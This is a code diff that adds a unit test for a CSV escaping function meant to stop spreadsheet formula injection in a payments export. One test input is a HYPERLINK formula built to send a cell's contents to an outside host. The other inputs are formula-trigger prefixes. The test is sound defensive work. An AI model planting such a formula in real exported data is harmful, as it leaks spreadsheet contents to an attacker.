@@ -207,3 +207,14 @@ describe("adults only: 18 on the studio's calendar day (A-062)", () => {
     assert.equal(ageOn("2008-02-29", "2028-02-29"), 20);
   });
 });
+
+describe("payments CSV (A-042)", () => {
+  test("cells that a spreadsheet would run as a formula start with an apostrophe", async () => {
+    const { csvCell } = await import("../src/lib/csv");
+    assert.equal(csvCell('=HYPERLINK("https://x/?"&A1,"x")'), `"'=HYPERLINK(""https://x/?""&A1,""x"")"`);
+    for (const v of ["+1", "-2+3", "@SUM(A1)", "\tx", "\rx", "=1+1"]) assert.equal(csvCell(v).slice(0, 2), `"'`, JSON.stringify(v));
+    assert.equal(csvCell("Elena Georgiou"), '"Elena Georgiou"');
+    assert.equal(csvCell(null), '""');
+    assert.equal(csvCell("-12.50"), '"-12.50"', "amounts stay numbers");
+  });
+});
